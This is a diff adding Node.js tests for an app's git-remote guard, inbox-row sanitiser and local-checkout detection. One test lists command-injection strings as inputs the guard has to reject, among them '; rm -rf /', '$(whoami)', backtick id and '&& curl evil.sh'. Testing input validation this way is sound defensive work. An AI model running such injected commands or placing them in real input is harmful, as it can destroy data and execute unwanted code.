@@ -21,7 +21,7 @@ import fs from 'node:fs'
 import os from 'node:os'
 import path from 'node:path'
 import { execFileSync } from 'node:child_process'
-import { remotesMatch, cwdGitRemote, darkCount, attentionDigest, summarizeInbox, socketPath } from './inbox-probe.mjs'
+import { remotesMatch, cwdGitRemote, darkCount, attentionDigest, summarizeInbox, socketPath, isSafeRepoRemote, sanitizeInboxRows, pageDrainableHere, reachableCheckout, localCheckoutPath } from './inbox-probe.mjs'
 
 // ── Where the desktop is ─────────────────────────────────────────────────────
 // One machine can run more than one Designless app. Unset, the probe looks
@@ -124,6 +124,86 @@ test('an unknown remote never matches anything', () => {
   assert.equal(remotesMatch('   ', 'git@github.com:org/repo.git'), false)
 })
 
+// ── The guard in front of the normaliser ─────────────────────────────────────
+//
+// isSafeRepoRemote decides whether a row is SURFACED AT ALL. It is not an
+// identity rule and must never drift into behaving like one: anything the
+// normaliser folds has to survive it, or a legitimate session is erased before
+// anyone can see it. These tests exist because it did drift, and nothing here
+// covered it.
+
+test('the guard is never narrower than the normaliser it guards', () => {
+  const everySpelling = [...SAME, ...NOT_A_FORGE_PATH].flatMap(([, a, b]) => [a, b])
+  for (const remote of everySpelling) {
+    assert.equal(isSafeRepoRemote(remote), true, `the normaliser folds it, the guard refused it: ${remote}`)
+  }
+})
+
+test('a local checkout is surfaced, not erased', () => {
+  // The server instructs agents to pass a local repo as file://<abs path>. A row
+  // carrying one was dropped whole, so every passive surface reported nothing
+  // waiting while real edits sat pending.
+  const row = {
+    title: 'Skyway',
+    n_page: 4,
+    repo_remote: 'file:///Users/someone/Projects/skyway/site',
+    safety_branch: 'designless/60c93584',
+  }
+  assert.equal(isSafeRepoRemote(row.repo_remote), true)
+  const kept = sanitizeInboxRows([row])
+  assert.equal(kept.length, 1, 'the session must survive the sanitiser')
+  assert.equal(kept[0].n_page, 4, 'and its pending edits must still be visible')
+})
+
+test('ssh:// survives, so the folding written for it is reachable', () => {
+  assert.equal(isSafeRepoRemote('ssh://git@bitbucket.acme.com:7999/PROJ/repo.git'), true)
+  assert.equal(isSafeRepoRemote('ssh://git@ssh.dev.azure.com:v3/org/project/repo'), true)
+})
+
+test("injection is still refused, which is this guard's actual job", () => {
+  for (const bad of [
+    'https://github.com/o/r.git; rm -rf /',
+    'file:///tmp/$(whoami)',
+    'git@host:o/r`id`',
+    'https://host/o/r && curl evil.sh',
+    'https://host/o/r\nwhoami',
+    "https://host/o/r'",
+    'file:///tmp/a\tb',
+    '',
+    '   ',
+  ]) {
+    assert.equal(isSafeRepoRemote(bad), false, `should have been refused: ${JSON.stringify(bad)}`)
+  }
+  assert.equal(isSafeRepoRemote(null), false)
+  assert.equal(isSafeRepoRemote(42), false)
+})
+
+test('a folder with a space in its name is not thrown away', () => {
+  // Refusing these cost the whole row, and a person who keeps their work in
+  // "My Projects" is not doing anything unusual. The space is made safe by
+  // quoting where the value is embedded, not by refusing the person.
+  const spaced = 'file:///Users/someone/My Projects/skyway'
+  assert.equal(isSafeRepoRemote(spaced), true)
+  assert.equal(sanitizeInboxRows([{ title: 'x', n_page: 2, repo_remote: spaced, safety_branch: 'designless/abc' }]).length, 1)
+})
+
+test('a path an agent is told to cd into is quoted', () => {
+  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-quote-')))
+  const repo = path.join(root, 'my site'); fs.mkdirSync(repo)
+  execFileSync('git', ['init', '-q'], { cwd: repo })
+  const out = summarizeInbox([{ title: 'Skyway', n_page: 1, repo_remote: `file://${repo}`, safety_branch: 'designless/abc' }], root)
+  const said = out?.line || (Array.isArray(out?.lines) ? out.lines.join(' ') : String(out ?? ''))
+  assert.ok(said.includes(`'${repo}'`), `the path must be quoted or a space splits it in two: ${said.slice(0, 200)}`)
+  fs.rmSync(root, { recursive: true, force: true })
+})
+
+test('a malformed remote still drops its row; an absent one does not', () => {
+  const base = { title: 'x', n_page: 1, safety_branch: 'designless/abc' }
+  assert.equal(sanitizeInboxRows([{ ...base, repo_remote: 'https://h/o/r; id' }]).length, 0)
+  assert.equal(sanitizeInboxRows([{ ...base, repo_remote: null }]).length, 1)
+  assert.equal(sanitizeInboxRows([{ ...base, safety_branch: 'main' }]).length, 0)
+})
+
 // cwdGitRemote reads git's own files rather than shelling out, so the two shapes
 // of `.git` both have to be handled: a directory in a normal clone, and a FILE
 // pointing elsewhere in a linked worktree. The worktree case used to throw and
@@ -159,6 +239,118 @@ test('no git, no origin: unknown rather than a wrong answer', () => {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-nogit-'))
   assert.equal(cwdGitRemote(dir), null)
   fs.rmSync(dir, { recursive: true, force: true })
+})
+
+// The test above is named for two cases and only ever covered one: a directory
+// with no git at all. "git, but no origin" was never asserted, which is how a
+// local-only checkout came to be unrecognisable to itself.
+
+test('a repo with no origin identifies itself by its path', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-local-'))
+  execFileSync('git', ['init', '-q'], { cwd: dir })
+  const id = cwdGitRemote(dir)
+  assert.ok(id, 'a local-only checkout must have an identity, not null')
+  // The server records this checkout as file://<abs path>; both sides must fold
+  // to the same string or the drain gate sends the person to where they are.
+  assert.equal(remotesMatch(id, `file://${fs.realpathSync(dir)}`), true)
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+test('an origin still wins over the path fallback', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-origin-'))
+  execFileSync('git', ['init', '-q'], { cwd: dir })
+  execFileSync('git', ['remote', 'add', 'origin', 'git@github.com:org/repo.git'], { cwd: dir })
+  assert.equal(remotesMatch(cwdGitRemote(dir), 'https://github.com/org/repo'), true)
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+test('the drain gate recognises a local checkout as HERE, end to end', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-e2e-'))
+  execFileSync('git', ['init', '-q'], { cwd: dir })
+  const row = {
+    title: 'Skyway',
+    n_page: 4,
+    repo_remote: `file://${fs.realpathSync(dir)}`,
+    safety_branch: 'designless/60c93584',
+  }
+  // the exact expression canvas-drain-check.mjs uses to decide drainability
+  const origin = cwdGitRemote(dir)
+  const here = sanitizeInboxRows([row]).filter(
+    (x) => Number(x.n_page || 0) > 0 && (x.repo_remote ? remotesMatch(origin, x.repo_remote) : true),
+  )
+  assert.equal(here.length, 1, 'the session must be drainable in the checkout it belongs to')
+  assert.equal(here[0].n_page, 4)
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+// ── Finding the checkout you are actually standing in ───────────────────────
+//
+// cwdGitRemote only looks AT cwd. Two ordinary layouts are the right checkout
+// and used to route the person to "another repo": the app repo one directory
+// below the folder they opened, and standing in a subdirectory of the repo.
+
+const mkRepo = (dir) => { fs.mkdirSync(dir, { recursive: true }); execFileSync('git', ['init', '-q'], { cwd: dir }); return dir }
+const pageRow = (repoDir) => ({ title: 'Skyway', n_page: 1, repo_remote: `file://${repoDir}`, safety_branch: 'designless/abc' })
+
+test('localCheckoutPath reads a file:// remote and ignores every other kind', () => {
+  assert.equal(localCheckoutPath('file:///Users/me/app'), '/Users/me/app')
+  assert.equal(localCheckoutPath('file:///Users/me/my%20app'), '/Users/me/my app')
+  assert.equal(localCheckoutPath('https://github.com/o/r.git'), null)
+  assert.equal(localCheckoutPath('git@github.com:o/r.git'), null)
+  assert.equal(localCheckoutPath(null), null)
+})
+
+test('the repo one directory below the folder you opened is HERE', () => {
+  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-below-')))
+  const repo = mkRepo(path.join(root, 'site'))
+  const s = pageRow(repo)
+  assert.equal(pageDrainableHere(s, cwdGitRemote(root), root), true)
+  assert.equal(reachableCheckout(s, root), repo)
+  fs.rmSync(root, { recursive: true, force: true })
+})
+
+test('standing inside the repo is HERE', () => {
+  const repo = fs.realpathSync(mkRepo(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-inside-'))))
+  const sub = path.join(repo, 'src', 'deep'); fs.mkdirSync(sub, { recursive: true })
+  assert.equal(pageDrainableHere(pageRow(repo), cwdGitRemote(sub), sub), true)
+  fs.rmSync(repo, { recursive: true, force: true })
+})
+
+test('a checkout outside the tree you opened is NOT here', () => {
+  const a = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-a-')))
+  const b = fs.realpathSync(mkRepo(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-b-'))))
+  // Containment: a server-supplied path must never send an agent somewhere the
+  // person did not open, however real that path is.
+  assert.equal(pageDrainableHere(pageRow(b), cwdGitRemote(a), a), false)
+  assert.equal(reachableCheckout(pageRow(b), a), null)
+  fs.rmSync(a, { recursive: true, force: true }); fs.rmSync(b, { recursive: true, force: true })
+})
+
+test('a path inside the tree that is not a repo is NOT here', () => {
+  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-norepo-')))
+  const notRepo = path.join(root, 'site'); fs.mkdirSync(notRepo)
+  assert.equal(pageDrainableHere(pageRow(notRepo), cwdGitRemote(root), root), false)
+  fs.rmSync(root, { recursive: true, force: true })
+})
+
+test('the drain line names the checkout when it is not where you are standing', () => {
+  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-hint-')))
+  const repo = mkRepo(path.join(root, 'site'))
+  const out = summarizeInbox([pageRow(repo)], root)
+  const said = out?.line || (Array.isArray(out?.lines) ? out.lines.join(' ') : String(out ?? ''))
+  assert.match(said, /drainable from this checkout/)
+  assert.ok(said.includes(repo), `the line must name where to work, got: ${said.slice(0, 200)}`)
+  fs.rmSync(root, { recursive: true, force: true })
+})
+
+test('a remote-backed session is unaffected by any of this', () => {
+  const repo = fs.realpathSync(mkRepo(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-remote-'))))
+  execFileSync('git', ['remote', 'add', 'origin', 'git@github.com:org/repo.git'], { cwd: repo })
+  const s = { title: 'x', n_page: 1, repo_remote: 'https://github.com/org/repo', safety_branch: 'designless/abc' }
+  assert.equal(pageDrainableHere(s, cwdGitRemote(repo), repo), true)
+  const other = { ...s, repo_remote: 'https://github.com/org/DIFFERENT' }
+  assert.equal(pageDrainableHere(other, cwdGitRemote(repo), repo), false)
+  fs.rmSync(repo, { recursive: true, force: true })
 })
 
 // ── The dark count (fail-safe A) reaches the wake line ───────────────────────
